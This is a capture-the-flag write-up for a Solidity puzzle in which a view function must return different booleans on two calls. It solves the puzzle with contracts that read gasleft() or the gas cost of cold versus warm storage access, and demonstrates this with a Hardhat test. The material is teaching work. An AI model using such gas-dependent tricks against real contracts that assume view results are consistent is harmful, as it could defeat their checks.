# Custom Challenge: True XOR

**Objective of CTF:**

- Make a successfull call to the `ctf` function.
- The given `target` parameter should belong to a contract deployed by you, and should use `IBoolGiver` interface.

**Target contract:**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBoolGiver {
  function giveBool() external view returns (bool);
}

contract TrueXOR {
  function ctf(address target) external view returns (bool) {
    bool p = IBoolGiver(target).giveBool();
    bool q = IBoolGiver(target).giveBool();
    require((p && q) != (p || q), "bad bools");
    require(msg.sender == tx.origin, "bad sender");
    return true;
  }
}
```

## The Solution

The logical operation that is happening in `ctf` basically does an XOR. If the XOR of `p` and `q` is 0, the transaction will revert. Furthermore, we require the sender to be an EOA.

The question boils down to this: how can we return different values from a `view` function? We need to somehow change the state without using `view`, but how can we do that? Well, we don't have to be the ones to change the state; EVM does it literally every instruction by changing the `gasleft` result! So, if we can find the remaining gas in between the two calls to `giveBool`, we can use that to return a different result.

### Proof of Concept

Here is the attacker contract:

```solidity
contract TrueXORAttacker is IBoolGiver {
  uint t = 28543000;

  function giveBool() external view override returns (bool) {
    uint g = gasleft();
    return g < t;
  }

  function changeThreshold(uint _t) external {
    t = _t;
  }
}
```

We added an extra `changeThreshold` function to avoid deploying a new contract in case we miss the sweet spot for the `gasleft`. In my case, `28543000` was the correct amount, such that within the first call there is more gas, and within the second call there is less gas.

The Hardhat test code to demonstrate this attack is given below. Contract types are generated via TypeChain.

```typescript
describe('Custom: True XOR', () => {
  let contract: TrueXOR;
  let attackerContract: TrueXORAttacker;
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;

  before(async () => {
    [owner, attacker] = await ethers.getSigners();
    contract = await ethers.getContractFactory('TrueXOR', owner).then(f => f.deploy());
    await contract.deployed();
  });

  it('should call `ctf` successfully', async () => {
    // deploy the attacker contract
    attackerContract = await ethers.getContractFactory('TrueXORAttacker', attacker).then(f => f.deploy());
    await attackerContract.deployed();

    expect(await contract.connect(attacker).ctf(attackerContract.address)).to.be.true;
  });
});
```

## Alternative Solution

If you look into detials of loading a storage variable, you will see that the first time a storage variable is loaded, it will cost minimum 2100 gas. Later loads however will cost a lot less, around a minimum 100. So, the gas usage of a storage variable load can tell us whether a function has been called before or not.

Here is an example contract for this scenario:

```solidity
contract TrueXORAttacker2 is IBoolGiver {
  uint256 slot0 = 12345;

  function giveBool() external view override returns (bool) {
    uint gas = gasleft();
    uint tmp = slot0;
    tmp; // silence warning
    return (gas - gasleft()) >= 2000;
  }
}
```

This works fine too!
